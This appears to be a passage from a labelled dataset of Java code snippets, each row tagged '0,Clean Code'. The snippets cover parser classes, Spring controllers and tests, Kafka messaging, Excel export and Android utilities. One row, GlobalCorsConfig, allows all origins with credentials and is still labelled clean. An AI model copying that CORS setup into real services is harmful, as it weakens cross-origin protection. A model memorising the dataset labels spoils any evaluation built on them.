      for (      Function<String,String> function : flushHandlerChain) {
        data=function.apply(data);
        if (function instanceof StatisticsFunction) {
          data=((StatisticsFunction)function).result();
        }
      }
    }
    if (stdoutHandlerChain != null) {
      for (      Function<String,String> function : stdoutHandlerChain) {
        if (function instanceof CloseFunction) {
          ((CloseFunction)function).close();
        }
      }
    }
  }
}
",0,Clean Code
"public static class From_join_type_clauseContext extends ParserRuleContext {
  public TerminalNode T_JOIN(){
    return getToken(HiveSqlParser.T_JOIN,0);
  }
  public TerminalNode T_INNER(){
    return getToken(HiveSqlParser.T_INNER,0);
  }
  public TerminalNode T_LEFT(){
    return getToken(HiveSqlParser.T_LEFT,0);
  }
  public TerminalNode T_RIGHT(){
    return getToken(HiveSqlParser.T_RIGHT,0);
  }
  public TerminalNode T_FULL(){
    return getToken(HiveSqlParser.T_FULL,0);
  }
  public TerminalNode T_OUTER(){
    return getToken(HiveSqlParser.T_OUTER,0);
  }
  public From_join_type_clauseContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_from_join_type_clause;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterFrom_join_type_clause(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitFrom_join_type_clause(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitFrom_join_type_clause(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"public abstract class SearchableModule<R,V extends RecyclerView.ViewHolder> {
  protected String keyword;
  private OnResultItemClickListener<R> listener;
  public abstract V onCreateViewHolder(  Fragment fragment,  @NonNull ViewGroup parent,  int type);
  public abstract void onBind(  Fragment fragment,  V holder,  R r);
  /** 
 * 目前是作为一个整体来处理onClick事件的
 * @param fragment
 * @param holder
 * @param view
 * @param r
 */
  public final void onClickInternal(  Fragment fragment,  V holder,  View view,  R r){
    InputMethodManager inputManager=(InputMethodManager)fragment.getActivity().getSystemService(Context.INPUT_METHOD_SERVICE);
    inputManager.hideSoftInputFromWindow(view.getWindowToken(),0);
    if (listener != null) {
      listener.onResultItemClick(fragment,holder.itemView,view,r);
    }
 else {
      onClick(fragment,holder,view,r);
    }
  }
  public void onClick(  Fragment fragment,  V holder,  View view,  R r){
  }
  /** 
 * -1, 0, 1 内部保留使用，所有的 {@link SearchableModule} 之间，{@code viewType} 不能重复
 * @param r one of the search results
 * @return
 */
  public abstract int getViewType(  R r);
  public abstract int priority();
  public abstract String category();
  public final List<R> searchInternal(  String keyword){
    this.keyword=keyword;
    return search(keyword);
  }
  /** 
 * 具体的搜索逻辑 <p> 本方法在工作线程执行
 * @param keyword
 * @return
 */
  public abstract List<R> search(  String keyword);
  public void setOnResultItemListener(  OnResultItemClickListener<R> listener){
    this.listener=listener;
  }
  /** 
 * @return true, 只展示4项，其他收起；false，不可展开, 全部直接展开<p> 可展示时，默认展示4项，其他的需要点击显示更多，才展示
 */
  public boolean expandable(){
    return true;
  }
  public static final int DEFAULT_SHOW_RESULT_ITEM_COUNT=4;
}
",0,Clean Code
"/** 
 * Debugging input stream for Hessian requests.
 */
public class HessianDebugInputStream extends InputStream {
  private InputStream _is;
  private HessianDebugState _state;
  /** 
 * Creates an uninitialized Hessian input stream.
 */
  public HessianDebugInputStream(  InputStream is,  OutputStream os){
    this(is,new PrintWriter(os));
  }
  /** 
 * Creates an uninitialized Hessian input stream.
 */
  public HessianDebugInputStream(  InputStream is,  PrintWriter dbg){
    _is=is;
    if (dbg == null)     dbg=new PrintWriter(System.out);
    _state=new HessianDebugState(dbg);
  }
  /** 
 * Creates an uninitialized Hessian input stream.
 */
  public HessianDebugInputStream(  InputStream is,  Logger log,  Level level){
    this(is,new PrintWriter(new LogWriter(log,level)));
  }
  /** 
 * Creates an uninitialized Hessian input stream.
 */
  public HessianDebugInputStream(  Logger log,  Level level){
    this(null,log,level);
  }
  public void initPacket(  InputStream is){
    _is=is;
  }
  public void startTop2(){
    _state.startTop2();
  }
  public void startData1(){
    _state.startData1();
  }
  public void startStreaming(){
    _state.startStreaming();
  }
  public void setDepth(  int depth){
    _state.setDepth(depth);
  }
  /** 
 * Reads a character.
 */
  public int read() throws IOException {
    int ch;
    InputStream is=_is;
    if (is == null)     return -1;
 else {
      ch=is.read();
    }
    _state.next(ch);
    return ch;
  }
  /** 
 * closes the stream.
 */
  public void close() throws IOException {
    InputStream is=_is;
    _is=null;
    if (is != null)     is.close();
    _state.println();
  }
static class LogWriter extends Writer {
    private Logger _log;
    private Level _level;
    private StringBuilder _sb=new StringBuilder();
    LogWriter(    Logger log,    Level level){
      _log=log;
      _level=level;
    }
    public void write(    char ch){
      if (ch == '\n' && _sb.length() > 0) {
        _log.log(_level,_sb.toString());
        _sb.setLength(0);
      }
 else       _sb.append((char)ch);
    }
    public void write(    char[] buffer,    int offset,    int length){
      for (int i=0; i < length; i++) {
        char ch=buffer[offset + i];
        if (ch == '\n' && _sb.length() > 0) {
          _log.log(_level,_sb.toString());
          _sb.setLength(0);
        }
 else         _sb.append((char)ch);
      }
    }
    public void flush(){
    }
    public void close(){
    }
  }
}
",0,Clean Code
"@RestController public class HelloController {
  @GetMapping(""/persons"") public Publisher<String> persons(){
    return Mono.just(""OK"");
  }
  @Bean public GroupedOpenApi userOpenApi(){
    return GroupedOpenApi.builder().group(""users"").packagesToScan(""test.org.springdoc.api.v30.app152"").build();
  }
}
@RestController @RequestMapping(""/api"") public class HelloController {
  @GetMapping public String helloWorld(){
    return ""ok"";
  }
@Configuration public class WebConfig implements WebMvcConfigurer {
    @Override public void configurePathMatch(    PathMatchConfigurer configurer){
      configurer.setPatternParser(new PathPatternParser());
    }
  }
}
/** 
 * The type Hello controller.
 */
@RestController @RequestMapping(""/api"") class HelloController {
  /** 
 * Hello world string.
 * @return the string
 */
  @GetMapping public String helloWorld(){
    return ""ok"";
  }
  /** 
 * The type Web config.
 */
@Configuration class WebConfig implements WebMvcConfigurer {
    /** 
 * Configure path match.
 * @param configurer the configurer
 */
    @Override public void configurePathMatch(    PathMatchConfigurer configurer){
      configurer.setPatternParser(new PathPatternParser());
    }
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public class MultiGetExample {
  private static final Logger LOG=LoggerFactory.getLogger(MultiGetExample.class);
  public static void main(  final String[] args) throws Exception {
    final Client client=new Client();
    client.init();
    multiGet(client.getRheaKVStore());
    client.shutdown();
  }
  public static void multiGet(  final RheaKVStore rheaKVStore){
    final List<byte[]> keys=Lists.newArrayList();
    for (int i=0; i < 10; i++) {
      final byte[] bytes=writeUtf8(""multi_get_demo_"" + i);
      keys.add(bytes);
      rheaKVStore.bPut(bytes,bytes);
    }
    final CompletableFuture<Map<ByteArray,byte[]>> f1=rheaKVStore.multiGet(keys);
    final CompletableFuture<Map<ByteArray,byte[]>> f2=rheaKVStore.multiGet(keys,false);
    CompletableFuture.allOf(f1,f2).join();
    for (    Map.Entry<ByteArray,byte[]> entry : f1.join().entrySet()) {
      LOG.info(""Async multiGet: key={}, value={}"",readUtf8(entry.getKey().getBytes()),readUtf8(entry.getValue()));
    }
    for (    Map.Entry<ByteArray,byte[]> entry : f2.join().entrySet()) {
      LOG.info(""Async multiGet: key={}, value={}"",readUtf8(entry.getKey().getBytes()),readUtf8(entry.getValue()));
    }
    final Map<ByteArray,byte[]> map1=rheaKVStore.bMultiGet(keys);
    Map<ByteArray,byte[]> map2=rheaKVStore.bMultiGet(keys,false);
    for (    Map.Entry<ByteArray,byte[]> entry : map1.entrySet()) {
      LOG.info(""Sync multiGet: key={}, value={}"",readUtf8(entry.getKey().getBytes()),readUtf8(entry.getValue()));
    }
    for (    Map.Entry<ByteArray,byte[]> entry : map2.entrySet()) {
      LOG.info(""Sync multiGet: key={}, value={}"",readUtf8(entry.getKey().getBytes()),readUtf8(entry.getValue()));
    }
  }
}",0,Clean Code
"@SpringBootTest(webEnvironment=WebEnvironment.DEFINED_PORT,properties={""management.endpoints.web.exposure.include=*"",""server.port=53593"",""springdoc.use-management-port=true"",""springdoc.group-configs[0].group=users"",""springdoc.group-configs[0].packages-to-scan=test.org.springdoc.api.v30.app145"",""management.server.port=9283"",""management.endpoints.web.base-path=/application""}) public class SpringDocApp145Test extends AbstractSpringDocActuatorTest {
  @Test void testApp(){
    webTestClient.get().uri(Constants.DEFAULT_API_DOCS_URL + ""/users"").exchange().expectStatus().isNotFound();
  }
  @Test void testApp3() throws Exception {
    try {
      webClient.get().uri(""/application/openapi"" + ""/"" + Constants.DEFAULT_GROUP_NAME).retrieve().bodyToMono(String.class).block();
      fail();
    }
 catch (    WebClientResponseException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
 else       fail();
    }
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
@SpringBootTest(webEnvironment=WebEnvironment.DEFINED_PORT,properties={""management.endpoints.web.exposure.include=*"",""server.port=53556"",""springdoc.use-management-port=true"",""springdoc.group-configs[0].group=users"",""springdoc.group-configs[0].packages-to-scan=test.org.springdoc.api.v30.app145"",""management.server.port=9391"",""management.endpoints.web.base-path=/application""}) public class SpringDocApp145Test extends AbstractSpringDocActuatorTest {
  @Test void testApp() throws Exception {
    mockMvc.perform(get(Constants.DEFAULT_API_DOCS_URL + ""/users"")).andExpect(status().isNotFound());
  }
  @Test void testApp1() throws Exception {
    try {
      actuatorRestTemplate.getForObject(""/application/openapi"",String.class);
      fail();
    }
 catch (    HttpClientErrorException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
 else       fail();
    }
  }
  @Test void testApp2() throws Exception {
    String result=actuatorRestTemplate.getForObject(""/application/openapi/users"",String.class);
    String expected=getContent(""results/3.0.1/app145.json"");
    assertEquals(expected,result,true);
  }
  @Test void testApp3() throws Exception {
    try {
      actuatorRestTemplate.getForObject(""/application/openapi"" + ""/"" + Constants.DEFAULT_GROUP_NAME,String.class);
      fail();
    }
 catch (    HttpStatusCodeException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
    }
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
",0,Clean Code
"public class ParameterTool {
  protected static final String NO_VALUE_KEY=""__NO_VALUE_KEY"";
  public static String getKeyFromArgs(  String[] args,  int index){
    String key;
    if (args[index].startsWith(""--"")) {
      key=args[index].substring(2);
    }
 else     if (args[index].startsWith(""-"")) {
      key=args[index].substring(1);
    }
 else {
      throw new IllegalArgumentException(String.format(""Error parsing arguments '%s' on '%s'. Please prefix keys with -- or -."",Arrays.toString(args),args[index]));
    }
    if (key.isEmpty()) {
      throw new IllegalArgumentException(""The input "" + Arrays.toString(args) + "" contains an empty argument"");
    }
    return key;
  }
  public static Map<String,String> fromArgs(  String[] args){
    final Map<String,String> map=new HashMap<>(args.length / 2);
    int i=0;
    while (i < args.length) {
      final String key=getKeyFromArgs(args,i);
      if (key.isEmpty()) {
        throw new IllegalArgumentException(""The input "" + Arrays.toString(args) + "" contains an empty argument"");
      }
      i+=1;
      if (i >= args.length) {
        map.put(key,NO_VALUE_KEY);
      }
 else       if (NumberUtils.isCreatable(args[i])) {
        map.put(key,args[i]);
        i+=1;
      }
 else       if (args[i].startsWith(""--"") || args[i].startsWith(""-"")) {
        map.put(key,NO_VALUE_KEY);
      }
 else {
        map.put(key,args[i]);
        i+=1;
      }
    }
    return map;
  }
}
",0,Clean Code
"/** 
 * @auther macrozheng
 * @description 全局跨域配置
 * @date 2019/7/27
 * @github https://github.com/macrozheng
 */
@Configuration public class GlobalCorsConfig {
  /** 
 * 允许跨域调用的过滤器
 */
  @Bean public CorsFilter corsFilter(){
    CorsConfiguration config=new CorsConfiguration();
    config.addAllowedOrigin(""*"");
    config.setAllowCredentials(true);
    config.addAllowedHeader(""*"");
    config.addAllowedMethod(""*"");
    UrlBasedCorsConfigurationSource source=new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration(""/**"",config);
    return new CorsFilter(source);
  }
}
/** 
 * @auther macrozheng
 * @description 全局跨域配置
 * @date 2019/7/27
 * @github https://github.com/macrozheng
 */
@Configuration public class GlobalCorsConfig {
  /** 
 * 允许跨域调用的过滤器
 */
  @Bean public CorsFilter corsFilter(){
    CorsConfiguration config=new CorsConfiguration();
    config.addAllowedOriginPattern(""*"");
    config.setAllowCredentials(true);
    config.addAllowedHeader(""*"");
    config.addAllowedMethod(""*"");
    UrlBasedCorsConfigurationSource source=new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration(""/**"",config);
    return new CorsFilter(source);
  }
}
/** 
 * @auther macrozheng
 * @description 全局跨域配置
 * @date 2019/7/27
 * @github https://github.com/macrozheng
 */
@Configuration public class GlobalCorsConfig {
  /** 
 * 允许跨域调用的过滤器
 */
  @Bean public CorsFilter corsFilter(){
    CorsConfiguration config=new CorsConfiguration();
    config.addAllowedOriginPattern(""*"");
    config.setAllowCredentials(true);
    config.addAllowedHeader(""*"");
    config.addAllowedMethod(""*"");
    UrlBasedCorsConfigurationSource source=new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration(""/**"",config);
    return new CorsFilter(source);
  }
}
",0,Clean Code
"/** 
 * An object that can apply a rich notification style to a  {@link Notification.Builder}object. <br> If the platform does not provide rich notification styles, methods in this class have no effect.
 */
public static abstract class Style {
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) protected Builder mBuilder;
  CharSequence mBigContentTitle;
  CharSequence mSummaryText;
  boolean mSummaryTextSet=false;
  public void setBuilder(  Builder builder){
    if (mBuilder != builder) {
      mBuilder=builder;
      if (mBuilder != null) {
        mBuilder.setStyle(this);
      }
    }
  }
  public Notification build(){
    Notification notification=null;
    if (mBuilder != null) {
      notification=mBuilder.build();
    }
    return notification;
  }
  /** 
 * Applies the compat style data to the framework  {@link Notification} in a backwardscompatible way. All other data should be stored within the Notification's extras.
 */
  @RestrictTo(LIBRARY_GROUP) public void apply(  NotificationBuilderWithBuilderAccessor builder){
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) public RemoteViews makeContentView(  NotificationBuilderWithBuilderAccessor builder){
    return null;
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) public RemoteViews makeBigContentView(  NotificationBuilderWithBuilderAccessor builder){
    return null;
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) public RemoteViews makeHeadsUpContentView(  NotificationBuilderWithBuilderAccessor builder){
    return null;
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) public void addCompatExtras(  Bundle extras){
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) protected void restoreFromCompatExtras(  Bundle extras){
  }
  /** 
 */
  @RestrictTo(LIBRARY_GROUP) public Bitmap createColoredBitmap(  int iconId,  int color){
    return createColoredBitmap(iconId,color,0);
  }
  private Bitmap createColoredBitmap(  int iconId,  int color,  int size){
    Drawable drawable=mBuilder.mContext.getResources().getDrawable(iconId);
    int width=size == 0 ? drawable.getIntrinsicWidth() : size;
    int height=size == 0 ? drawable.getIntrinsicHeight() : size;
    Bitmap resultBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
    drawable.setBounds(0,0,width,height);
    if (color != 0) {
      drawable.mutate().setColorFilter(new PorterDuffColorFilter(color,PorterDuff.Mode.SRC_IN));
    }
    Canvas canvas=new Canvas(resultBitmap);
    drawable.draw(canvas);
    return resultBitmap;
  }
}
",0,Clean Code
"/** 
 * 基于 Kafka 的  {@link WebSocketMessageSender} 实现类
 * @author 芋道源码
 */
@Slf4j public class KafkaWebSocketMessageSender extends AbstractWebSocketMessageSender {
  private final KafkaTemplate<Object,Object> kafkaTemplate;
  private final String topic;
  public KafkaWebSocketMessageSender(  WebSocketSessionManager sessionManager,  KafkaTemplate<Object,Object> kafkaTemplate,  String topic){
    super(sessionManager);
    this.kafkaTemplate=kafkaTemplate;
    this.topic=topic;
  }
  @Override public void send(  Integer userType,  Long userId,  String messageType,  String messageContent){
    sendKafkaMessage(null,userId,userType,messageType,messageContent);
  }
  @Override public void send(  Integer userType,  String messageType,  String messageContent){
    sendKafkaMessage(null,null,userType,messageType,messageContent);
  }
  @Override public void send(  String sessionId,  String messageType,  String messageContent){
    sendKafkaMessage(sessionId,null,null,messageType,messageContent);
  }
  /** 
 * 通过 Kafka 广播消息
 * @param sessionId Session 编号
 * @param userId 用户编号
 * @param userType 用户类型
 * @param messageType 消息类型
 * @param messageContent 消息内容
 */
  private void sendKafkaMessage(  String sessionId,  Long userId,  Integer userType,  String messageType,  String messageContent){
    KafkaWebSocketMessage mqMessage=new KafkaWebSocketMessage().setSessionId(sessionId).setUserId(userId).setUserType(userType).setMessageType(messageType).setMessageContent(messageContent);
    try {
      kafkaTemplate.send(topic,mqMessage).get();
    }
 catch (    InterruptedException|ExecutionException e) {
      log.error(""[sendKafkaMessage][发送消息({}) 到 Kafka 失败]"",mqMessage,e);
    }
  }
}
",0,Clean Code
"final class AcquirableImpl<T> implements Acquirable<T> {
  static final AtomicLong WAIT_COUNTER_NANO=new AtomicLong();
  /** 
 * Global lock used for synchronization.
 */
  private static final ReentrantLock GLOBAL_LOCK=new ReentrantLock();
  private final T value;
  private TickThread assignedThread;
  public AcquirableImpl(  @NotNull T value){
    this.value=value;
  }
  @Override public @NotNull T unwrap(){
    return value;
  }
  @Override public @NotNull TickThread assignedThread(){
    VarHandle.acquireFence();
    return assignedThread;
  }
  void updateThread(  @NotNull TickThread thread){
    this.assignedThread=thread;
    VarHandle.releaseFence();
  }
  static @Nullable ReentrantLock enter(  @NotNull Thread currentThread,  @Nullable TickThread elementThread){
    if (elementThread == null)     return null;
    if (currentThread == elementThread)     return null;
    final ReentrantLock currentLock=currentThread instanceof TickThread ? ((TickThread)currentThread).lock() : null;
    final ReentrantLock targetLock=elementThread.lock();
    if (targetLock.isHeldByCurrentThread())     return null;
    final long time=System.nanoTime();
    if (currentLock != null) {
      while (!GLOBAL_LOCK.tryLock()) {
        currentLock.unlock();
        currentLock.lock();
      }
    }
 else {
      GLOBAL_LOCK.lock();
    }
    targetLock.lock();
    WAIT_COUNTER_NANO.addAndGet(System.nanoTime() - time);
    return targetLock;
  }
  static void leave(  @Nullable ReentrantLock lock){
    if (lock != null) {
      lock.unlock();
      GLOBAL_LOCK.unlock();
    }
  }
}
",0,Clean Code
"/** 
 * Excel导出工具类
 * @author geekidea
 * @date 2022/8/22
 */
public class ExcelExportUtil {
  private static final String CONTENT_TYPE=""application/vnd.ms-excel"";
  private static final String CONTENT_DISPOSITION=""Content-disposition"";
  private static final String CHARACTER_ENCODING=""UTF-8"";
  private static final String EXCEL_SUFFIX="".xlsx"";
  public static void export(  List<?> list,  Class<?> headClass,  HttpServletResponse response){
    export(list,headClass,null,null,response);
  }
  public static void export(  List<?> list,  Class<?> headClass,  String exportFileName,  HttpServletResponse response){
    export(list,headClass,exportFileName,null,response);
  }
  public static void export(  List<?> list,  Class<?> headClass,  String exportFileName,  String sheetName,  HttpServletResponse response){
    response.setContentType(CONTENT_TYPE);
    response.setCharacterEncoding(CHARACTER_ENCODING);
    ExcelWriter excelWriter=null;
    try {
      WriteCellStyle headWriteCellStyle=new WriteCellStyle();
      headWriteCellStyle.setFillForegroundColor(IndexedColors.WHITE.getIndex());
      WriteCellStyle contentWriteCellStyle=new WriteCellStyle();
      contentWriteCellStyle.setHorizontalAlignment(HorizontalAlignment.CENTER);
      HorizontalCellStyleStrategy horizontalCellStyleStrategy=new HorizontalCellStyleStrategy(headWriteCellStyle,contentWriteCellStyle);
      if (StringUtils.isBlank(exportFileName)) {
        String currentTime=new SimpleDateFormat(""yyyyMMddHHmmssS"").format(new Date());
        String random=RandomStringUtils.randomNumeric(6);
        exportFileName=currentTime + random;
      }
      exportFileName=URLEncoder.encode(exportFileName,CHARACTER_ENCODING);
      response.setHeader(CONTENT_DISPOSITION,""attachment;filename="" + exportFileName + EXCEL_SUFFIX);
      excelWriter=EasyExcel.write(response.getOutputStream()).registerWriteHandler(horizontalCellStyleStrategy).registerConverter(new LongStringConverter()).build();
      WriteSheet mainSheet=EasyExcel.writerSheet(0,sheetName).head(headClass).build();
      excelWriter.write(list,mainSheet);
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
 finally {
      if (excelWriter != null) {
        excelWriter.finish();
      }
    }
  }
}",0,Clean Code
"public static class NET_ACCESSCTLCARD_STATE extends SdkStructure {
  public static final int NET_ACCESSCTLCARD_STATE_UNKNOWN=-1;
  public static final int NET_ACCESSCTLCARD_STATE_NORMAL=0;
  public static final int NET_ACCESSCTLCARD_STATE_LOSE=0x01;
  public static final int NET_ACCESSCTLCARD_STATE_LOGOFF=0x02;
  public static final int NET_ACCESSCTLCARD_STATE_FREEZE=0x04;
  public static final int NET_ACCESSCTLCARD_STATE_ARREARAGE=0x08;
  public static final int NET_ACCESSCTLCARD_STATE_OVERDUE=0x10;
  public static final int NET_ACCESSCTLCARD_STATE_PREARREARAGE=0x20;
}",0,Clean Code
"/** 
 * 自定义异常处理
 * @author zlt
 * @date 2020/3/30<p> Blog: http://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
public class JsonErrorWebExceptionHandler extends DefaultErrorWebExceptionHandler {
  public JsonErrorWebExceptionHandler(  ErrorAttributes errorAttributes,  WebProperties.Resources resourceProperties,  ErrorProperties errorProperties,  ApplicationContext applicationContext){
    super(errorAttributes,resourceProperties,errorProperties,applicationContext);
  }
  /** 
 * 获取异常属性
 */
  @Override protected Map<String,Object> getErrorAttributes(  ServerRequest request,  ErrorAttributeOptions options){
    Throwable error=super.getError(request);
    return responseError(request,error);
  }
  /** 
 * 指定响应处理方法为JSON处理的方法
 * @param errorAttributes
 */
  @Override protected RouterFunction<ServerResponse> getRoutingFunction(  ErrorAttributes errorAttributes){
    return RouterFunctions.route(RequestPredicates.all(),this::renderErrorResponse);
  }
  /** 
 * 根据code获取对应的HttpStatus
 * @param errorAttributes
 */
  @Override protected int getHttpStatus(  Map<String,Object> errorAttributes){
    Integer httpStatus=(Integer)errorAttributes.remove(""httpStatus"");
    return httpStatus != null ? httpStatus : HttpStatus.INTERNAL_SERVER_ERROR.value();
  }
  /** 
 * 构建异常信息
 * @param request
 * @param ex
 * @return
 */
  private String buildMessage(  ServerRequest request,  Throwable ex){
    StringBuilder message=new StringBuilder(""Failed to handle request ["");
    message.append(request.methodName());
    message.append("" "");
    message.append(request.uri());
    message.append(""]"");
    if (ex != null) {
      message.append("": "");
      message.append(ex.getMessage());
    }
    return message.toString();
  }
  /** 
 * 构建返回的JSON数据格式
 */
  private Map<String,Object> responseError(  ServerRequest request,  Throwable error){
    String errorMessage=buildMessage(request,error);
    int httpStatus=200;
    Map<String,Object> map=new HashMap<>();
    map.put(""resp_code"",1);
    map.put(""resp_msg"",errorMessage);
    map.put(""datas"",null);
    map.put(""httpStatus"",httpStatus);
    return map;
  }
  private int getHttpStatus(  Throwable error){
    int httpStatus;
    httpStatus=HttpStatus.INTERNAL_SERVER_ERROR.value();
    return httpStatus;
  }
}
",0,Clean Code
"/** 
 * Expression language AST node that represents an integer literal.
 * @author Andy Clement
 * @since 3.0
 */
class IntLiteral extends Literal {
  private final TypedValue value;
  public IntLiteral(  String payload,  int pos,  int value){
    super(payload,pos);
    this.value=new TypedValue(value);
    this.exitTypeDescriptor=""I"";
  }
  @Override public TypedValue getLiteralValue(){
    return this.value;
  }
  @Override public boolean isCompilable(){
    return true;
  }
  @Override public void generateCode(  MethodVisitor mv,  CodeFlow cf){
    int intValue=(Integer)this.value.getValue();
    if (intValue == -1) {
      mv.visitInsn(ICONST_M1);
    }
 else     if (intValue >= 0 && intValue < 6) {
      mv.visitInsn(ICONST_0 + intValue);
    }
 else {
      mv.visitLdcInsn(intValue);
    }
    cf.pushDescriptor(this.exitTypeDescriptor);
  }
}
",0,Clean Code
"public static class Create_procedure_stmtContext extends ParserRuleContext {
  public List<IdentContext> ident(){
    return getRuleContexts(IdentContext.class);
  }
  public IdentContext ident(  int i){
    return getRuleContext(IdentContext.class,i);
  }
  public Proc_blockContext proc_block(){
    return getRuleContext(Proc_blockContext.class,0);
  }
  public TerminalNode T_PROCEDURE(){
    return getToken(HiveSqlParser.T_PROCEDURE,0);
  }
  public TerminalNode T_PROC(){
    return getToken(HiveSqlParser.T_PROC,0);
  }
  public TerminalNode T_ALTER(){
    return getToken(HiveSqlParser.T_ALTER,0);
  }
  public TerminalNode T_CREATE(){
    return getToken(HiveSqlParser.T_CREATE,0);
  }
  public TerminalNode T_REPLACE(){
    return getToken(HiveSqlParser.T_REPLACE,0);
  }
  public Create_routine_paramsContext create_routine_params(){
    return getRuleContext(Create_routine_paramsContext.class,0);
  }
  public Create_routine_optionsContext create_routine_options(){
    return getRuleContext(Create_routine_optionsContext.class,0);
  }
  public Declare_block_inplaceContext declare_block_inplace(){
    return getRuleContext(Declare_block_inplaceContext.class,0);
  }
  public LabelContext label(){
    return getRuleContext(LabelContext.class,0);
  }
  public TerminalNode T_SEMICOLON(){
    return getToken(HiveSqlParser.T_SEMICOLON,0);
  }
  public TerminalNode T_AS(){
    return getToken(HiveSqlParser.T_AS,0);
  }
  public TerminalNode T_IS(){
    return getToken(HiveSqlParser.T_IS,0);
  }
  public TerminalNode T_OR(){
    return getToken(HiveSqlParser.T_OR,0);
  }
  public Create_procedure_stmtContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_create_procedure_stmt;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterCreate_procedure_stmt(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitCreate_procedure_stmt(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitCreate_procedure_stmt(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"public class CommonUtils {
  private static final int QR_CODE_MARGIN=2;
  private static final String LABEL=""Label"";
  public static String getAppName(  Context context){
    ApplicationInfo applicationInfo=context.getApplicationInfo();
    return context.getPackageManager().getApplicationLabel(applicationInfo).toString();
  }
  @Nullable public static Bitmap createQRCodeBitmap(  String content,  int width,  int height){
    Charset charset=StandardCharsets.UTF_8;
    if (TextUtils.isEmpty(content)) {
      return null;
    }
    if (width <= 0 || height <= 0) {
      return null;
    }
    Map<EncodeHintType,Object> hints=new HashMap<>();
    if (charset != null && !TextUtils.isEmpty(charset.name())) {
      hints.put(EncodeHintType.CHARACTER_SET,charset.name());
    }
    hints.put(EncodeHintType.ERROR_CORRECTION,ErrorCorrectionLevel.H);
    hints.put(EncodeHintType.MARGIN,QR_CODE_MARGIN);
    try {
      BitMatrix bitMatrix=new QRCodeWriter().encode(content,BarcodeFormat.QR_CODE,width,height,hints);
      int[] pixels=new int[width * height];
      for (int y=0; y < height; y++) {
        for (int x=0; x < width; x++) {
          pixels[y * width + x]=bitMatrix.get(x,y) ? Color.BLACK : Color.WHITE;
        }
      }
      Bitmap bitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
      bitmap.setPixels(pixels,0,width,0,0,width,height);
      return bitmap;
    }
 catch (    WriterException e) {
      e.printStackTrace();
    }
    return null;
  }
  public static void copyToClipboard(  String content,  String toastMessage){
    ClipboardManager cm=(ClipboardManager)TUILogin.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
    ClipData mClipData=ClipData.newPlainText(LABEL,content);
    cm.setPrimaryClip(mClipData);
    RoomToast.toastShortMessageCenter(toastMessage);
  }
}",0,Clean Code
"/** 
 * @author zhenyu.nie created on 2019 2019/5/22 11:54
 */
public abstract class AbstractCommand<T> implements CommunicateCommandProcessor<T>, UiRequestCommand {
  private final Class<T> type;
  @SuppressWarnings(""all"") public AbstractCommand(){
    Type superClass=this.getClass().getGenericSuperclass();
    Preconditions.checkArgument(!(superClass instanceof Class) && superClass instanceof ParameterizedType && ((ParameterizedType)superClass).getRawType() == AbstractCommand.class,""[%s]必须是[%s]的子类并且确定了泛型参数"");
    ParameterizedType t=(ParameterizedType)superClass;
    Type theType=t.getActualTypeArguments()[0];
    Preconditions.checkArgument(theType instanceof Class && ((Class)theType).getTypeParameters().length == 0,""[%s]参数必须是个非泛型类"",theType);
    this.type=(Class<T>)theType;
  }
  @Override @SuppressWarnings(""unchecked"") public final Optional<RequestData<T>> preprocessor(  RequestData<String> requestData,  ChannelHandlerContext ctx) throws Exception {
    if (type.equals(String.class)) {
      return doPreprocessor((RequestData<T>)requestData,ctx);
    }
 else {
      T command=JacksonSerializer.deSerialize(requestData.getCommand(),this.type);
      RequestData<T> data=RequestData.copyWithCommand(requestData,command);
      return doPreprocessor(data,ctx);
    }
  }
  protected Optional<RequestData<T>> doPreprocessor(  RequestData<T> requestData,  ChannelHandlerContext ctx) throws Exception {
    return Optional.of(requestData);
  }
  @Override public final Datagram prepareRequest(  String id,  RequestData<T> data,  String agentId){
    T command=prepareCommand(data,agentId);
    return RemotingBuilder.buildRequestDatagram(data.getType(),id,new RequestPayloadHolder(command));
  }
  protected T prepareCommand(  RequestData<T> data,  String agentId){
    return data.getCommand();
  }
  @Override public Datagram prepareResponse(  Datagram datagram){
    return datagram;
  }
  @Override public boolean supportPause(){
    return true;
  }
  @Override public final CommunicateCommandProcessor getProcessor(){
    return this;
  }
}
",0,Clean Code
"@SpringBootApplication public class EurekaProviderApplication {
